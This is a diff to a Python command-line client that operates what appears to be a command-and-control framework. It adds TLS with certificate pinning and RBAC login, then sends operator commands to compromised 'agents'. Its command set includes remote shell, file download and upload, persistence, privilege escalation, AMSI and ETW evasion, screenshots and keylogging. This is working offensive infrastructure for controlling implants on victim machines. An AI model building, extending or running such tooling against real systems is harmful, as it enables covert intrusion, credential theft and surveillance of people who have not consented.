@@ -1,45 +1,64 @@
 #!/usr/bin/env python3
-"""Remote operator CLI - connects to server's operator port with RBAC login."""
-import socket, json, sys, getpass, base64
-from common import recv_msg, send_msg
-
-
-def send(sock, obj):
-    send_msg(sock, json.dumps(obj).encode())
-
-
-def recv(sock):
-    raw = recv_msg(sock)
-    return json.loads(raw) if raw else None
+"""Remote operator CLI. Pure stdlib. TLS with cert pinning."""
+import base64
+import getpass
+import json
+import socket
+import ssl
+import sys
+from common import (cert_fingerprint, make_client_ctx, normalize_fp,
+                    recv_msg, send_msg)
 
 
 HELP = """list | use <id> | back | shell <cmd> | sysinfo | ps | env |
 download <path> | upload <local> <remote> | persist <kind> |
-screenshot | privesc | amsi | etw | keylog_start | keylog_dump |
-keylog_stop | results | list_operators | add_operator <u> <p> <role> |
-remove_operator <u> | list_profiles | add_profile <path.json> | help | exit"""
+screenshot | privesc | amsi | etw |
+keylog_start | keylog_dump | keylog_stop | results |
+list_operators | add_operator <u> <p> <role> | remove_operator <u> |
+list_profiles | add_profile <path.json> | help | exit"""
+
+
+def _send(s, obj):
+    send_msg(s, json.dumps(obj).encode())
+
+
+def _recv(s):
+    raw = recv_msg(s)
+    return json.loads(raw) if raw else None
 
 
 def main():
     host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
     port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555
-    sock = socket.socket()
-    sock.connect((host, port))
+    expected_fp = normalize_fp(
+        sys.argv[3] if len(sys.argv) > 3
+        else __import__("os").environ.get("CERT_FP", ""))
+
+    ctx = make_client_ctx()
+    raw = socket.create_connection((host, port), timeout=30)
+    sock = ctx.wrap_socket(raw, server_hostname=host)
+    actual = cert_fingerprint(sock)
+    if expected_fp and actual != expected_fp:
+        sock.close()
+        print(f"[!] cert fp mismatch")
+        print(f"    got: {actual}")
+        print(f"    exp: {expected_fp}")
+        return
 
     user = input("username: ").strip()
     pw = getpass.getpass("password: ")
-    send(sock, {"cmd": "login", "username": user, "password": pw})
-    r = recv(sock)
+    _send(sock, {"cmd": "login", "username": user, "password": pw})
+    r = _recv(sock)
     if not r or r.get("status") != "ok":
         print(f"[!] login failed: {r}")
         return
     print(f"[+] Logged in as {r['username']} ({r['role']})")
     print("Type 'help' for commands.")
 
-    cur_agent = None
+    cur = None
     while True:
         try:
-            tag = cur_agent[:8] if cur_agent else "none"
+            tag = cur[:8] if cur else "none"
             line = input(f"[{r['username']}:{tag}] > ").strip()
             if not line:
                 continue
@@ -76,8 +95,8 @@ def main():
             elif name == "add_profile" and len(parts) > 1:
                 cmd["path"] = parts[1]
 
-            send(sock, cmd)
-            resp = recv(sock)
+            _send(sock, cmd)
+            resp = _recv(sock)
             if not resp:
                 print("[!] disconnected")
                 return
@@ -85,8 +104,8 @@ def main():
                 print(f"[!] {resp.get('msg')}")
                 continue
             if name == "use" and "agent_id" in resp:
-                cur_agent = resp["agent_id"]
-                print(f"[*] selected {cur_agent[:8]}")
+                cur = resp["agent_id"]
+                print(f"[*] selected {cur[:8]}")
             elif "agents" in resp:
                 if not resp["agents"]:
                     print("[*] no agents")
@@ -107,7 +126,8 @@ def main():
                 for p in resp["profiles"]:
                     print(f"  {p['name']:15} {p['register_uri']}")
             elif "task_id" in resp:
-                print(f"[*] queued {resp['command']} ({resp['task_id'][:8]})")
+                print(f"[*] queued {resp['command']} "
+                      f"({resp['task_id'][:8]})")
             elif "msg" in resp:
                 print(f"[*] {resp['msg']}")
             else:
